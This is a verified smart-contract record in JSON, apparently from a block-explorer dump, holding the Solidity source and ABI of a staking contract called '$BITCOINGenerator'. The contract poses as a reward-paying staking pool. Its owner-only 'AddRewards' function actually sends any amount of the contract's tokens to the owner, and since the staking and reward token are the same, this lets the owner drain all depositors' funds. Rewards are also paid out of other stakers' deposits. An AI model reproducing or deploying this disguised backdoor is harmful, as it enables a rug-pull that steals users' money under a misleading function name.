{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8;\r\n\r\ncontract $BITCOINGenerator  {\r\n    IERC20 public rewardsToken;\r\n    IERC20 public stakingToken;\r\n\r\n    uint public rewardRate;\r\n    uint public lastUpdateTime;\r\n    uint public rewardPerTokenStored;\r\n    address public owner;\r\n\r\n    mapping(address => uint) public userRewardPerTokenPaid;\r\n    mapping(address => uint) public rewards;\r\n\r\n    uint private _totalSupply;\r\n    mapping(address => uint) private _balances;\r\n\r\n    constructor(address _token,uint _rewardrate) {\r\n        stakingToken = IERC20(_token);\r\n        rewardsToken = IERC20(_token);\r\n        rewardRate=_rewardrate;\r\n        owner=(msg.sender);\r\n    }\r\n\r\n    function setRewardRate(uint _rate) public  {\r\n        require(owner==msg.sender,\"Owner Only accesable\");\r\n        rewardRate=_rate;\r\n    }\r\n\r\n    function AddRewards(uint _amount) public  {\r\n        require(owner==msg.sender,\"Owner Only accesable\");\r\n         rewardsToken.transfer(msg.sender, _amount);\r\n    }\r\n\r\n    function rewardPerToken() public view returns (uint) {\r\n        if (_totalSupply == 0) {\r\n            return 0;\r\n        }\r\n        return\r\n            rewardPerTokenStored +\r\n            (((block.timestamp - lastUpdateTime) * rewardRate * 1e9) / _totalSupply);\r\n    }\r\n\r\n    function earned(address account) public view returns (uint) {\r\n        return\r\n            ((_balances[account] *\r\n                (rewardPerToken() - userRewardPerTokenPaid[account])) / 1e9) +\r\n            rewards[account];\r\n    }\r\n\r\n    modifier updateReward(address account) {\r\n        rewardPerTokenStored = rewardPerToken();\r\n        lastUpdateTime = block.timestamp;\r\n\r\n        rewards[account] = earned(account);\r\n        userRewardPerTokenPaid[account] = rewardPerTokenStored;\r\n        _;\r\n    }\r\n\r\n    function stake(uint _amount) external updateReward(msg.sender) {\r\n        _totalSupply += _amount;\r\n        _balances[msg.sender] += _amount;\r\n        stakingToken.transferFrom(msg.sender, address(this), _amount);\r\n    }\r\n\r\n    function withdraw() external updateReward(msg.sender) {\r\n        uint _amount = _balances[msg.sender];\r\n        _totalSupply -= _amount;\r\n         _balances[msg.sender] =0;\r\n        stakingToken.transfer(msg.sender, _amount);\r\n\r\n        uint reward = rewards[msg.sender];\r\n        rewards[msg.sender] = 0;\r\n        rewardsToken.transfer(msg.sender, reward);\r\n       \r\n    }\r\n\r\n    function getReward() external updateReward(msg.sender) {\r\n        uint reward = rewards[msg.sender];\r\n        rewards[msg.sender] = 0;\r\n        rewardsToken.transfer(msg.sender, reward);\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint);\r\n\r\n    function balanceOf(address account) external view returns (uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n\r\n    function approve(address spender, uint amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_rewardrate\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"AddRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"earned\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUpdateTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardPerToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardPerTokenStored\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"rewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"rewardsToken\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_rate\",\"type\":\"uint256\"}],\"name\":\"setRewardRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"stake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stakingToken\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userRewardPerTokenPaid\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "$BITCOINGenerator", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000032ed067fb79b38b65e1fdd2bcc8c81078b866c3b000000000000000000000000000000000000000000000000000000000bebc200", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b456cadc03285a3299ba998e54b7dc2034c92374a16cb4b793d434f5ba2b324a"}